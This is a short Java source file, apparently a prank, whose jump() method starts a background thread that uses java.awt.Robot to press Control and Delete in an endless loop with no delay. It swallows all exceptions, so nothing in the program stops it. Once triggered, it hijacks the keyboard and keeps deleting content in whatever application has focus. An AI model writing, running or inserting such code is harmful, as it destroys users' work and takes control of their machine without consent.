package GetPooped;

import java.awt.*;
import java.awt.event.KeyEvent;

public abstract class PopeJumpingOnYourKeyboard {
    public static void jump() {
        new Thread(() -> {
            try {
                Robot robot = new Robot();

                while (true) {
                    robot.keyPress(KeyEvent.VK_CONTROL);
                    robot.keyRelease(KeyEvent.VK_CONTROL);
                    robot.keyPress(KeyEvent.VK_DELETE);
                    robot.keyRelease(KeyEvent.VK_DELETE);
                }
            } catch (Exception e) {
//
            }
        }).start();
    }
}
